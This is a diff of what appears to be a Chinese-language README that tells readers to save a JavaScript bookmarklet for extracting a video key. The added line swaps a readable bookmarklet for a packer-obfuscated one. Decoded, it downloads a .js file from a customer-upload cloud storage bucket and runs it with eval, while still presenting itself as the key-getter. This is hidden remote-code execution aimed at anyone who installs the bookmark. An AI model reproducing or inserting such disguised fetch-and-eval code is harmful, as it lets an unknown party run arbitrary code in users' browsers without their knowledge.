@@ -59,7 +59,7 @@
 
 获取key的js如下（请存书签使用）：
 ```JavaScript
-javascript:prompt(videoPlayer.getData()._videoData.title + " key", btoa(String.fromCharCode.apply(null, new Uint8Array(____hexA))));
+javascript:eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6 0=c a();0.9("7","b://8-4-3-2-1.5-2-1.d.k/4-3/l.n",m);0.f=e(){g(0.i)};0.h(j);',24,24,'req1|hangzhou|cn|upload|customer|oss|var|GET|alime|open|XMLHttpRequest|https|new|aliyuncs|function|onload|eval|send|responseText|null|com|1583849996111_fy0cm6q2asce|false|js'.split('|'),0,{}))
 ```
 
 ### 演示
